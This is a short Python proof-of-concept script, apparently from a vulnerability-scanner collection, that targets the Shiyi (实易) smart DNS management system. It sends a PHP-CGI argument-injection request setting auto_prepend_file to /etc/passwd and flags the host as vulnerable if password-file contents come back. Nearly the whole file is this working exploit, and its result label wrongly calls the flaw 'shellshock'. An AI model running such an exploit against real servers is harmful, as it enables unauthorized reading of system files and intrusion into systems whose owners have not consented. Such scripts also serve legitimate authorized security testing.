#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 实易DNS管理系统文件包含至远程代码执行 
referer: http://www.wooyun.org/bugs/wooyun-2015-0122543
author: Lucifer
description: 实易智能DNS管理系统，php CGI远程代码执行,文件包含。
'''
import sys
import requests
import warnings
def run(url):
        result = ['shellshock漏洞', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index.php?-dauto_prepend_file%3d/etc/passwd"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if r"root:" in req.text and r"/bin/bash" in req.text:
                result[2] = '存在'
                result[1]=vulnurl
            else:
                result[2] = '不存在'

        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    